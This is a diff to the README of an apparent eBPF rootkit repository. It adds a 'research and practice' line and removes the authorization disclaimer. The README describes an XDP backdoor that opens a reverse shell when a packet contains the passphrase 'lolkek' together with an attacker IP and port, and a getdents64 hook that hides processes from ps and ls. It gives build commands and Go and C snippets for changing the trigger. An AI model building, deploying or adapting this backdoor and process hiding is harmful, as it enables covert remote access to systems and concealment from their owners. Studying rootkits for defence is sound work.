@@ -1,14 +1,16 @@
 # eBPF-rootkit
+This project was done for research and practice with eBPF
 
 This repository contains an eBPF rootkit that combines 2 main functions:
 
 Backdoor for remote access - uses `XDP` (eXpress Data Path) to monitor network traffic and launch a reverse shell when detecting a specific pattern in packets.
 
-Process Hiding - uses eBPF programs attached to the `getdents64` system call to hide specific processes from tools like `ps`, `htop`, `ls` etc.
+Process Hiding - uses eBPF programs attached to the `getdents64` system call to hide specific processes from `ps`, `htop`, `ls` etc.
 
 The process hiding part is taken from the [bad-bpf repository](https://github.com/pathtofile/bad-bpf/), but the loader has been rewritten in Go.
 
-## Dependencies
+## Build
+### Dependencies
 To build and run the project, you will need:
 
 * Go (version 1.16+)
@@ -23,7 +25,7 @@ sudo apt update
 sudo apt install -y clang llvm libbpf-dev linux-headers-$(uname -r)  
 go get github.com/cilium/ebpf
 
-# Building and Running
+# Building
 
 git clone https://github.com/cotsom/eBPF-rootkit.git  
 cd eBPF-rootkit
@@ -58,6 +60,7 @@ lolkek 192.168.123.200 4444
 ## Changing the Passphrase for the Reverse Shell
 For now the passphrase that triggers the reverse shell is `lolkek`
 
+**main.go:**
 ```go
 dataStr := string(data)
 if strings.Contains(dataStr, "lolkek") {
@@ -72,6 +75,7 @@ and the number of bytes received from tcp payload is equal to the number of char
 lolkek 192.168.123.200 4444 #27 characters
 ```
 
+**bpf.c:**
 ```C
 //GET TCP DATA
 unsigned char *tcpdata = (unsigned char *)tcp + tcp_header_bytes;
@@ -101,7 +105,3 @@ After changing the passphrase, you need to rebuild the project:
 `go generate`
 
 `go build -o ebpf-rootkit`
-
-
-### Disclaimer
-This tool is intended for educational purposes and security research only. Using this tool on systems without proper authorization may be illegal.
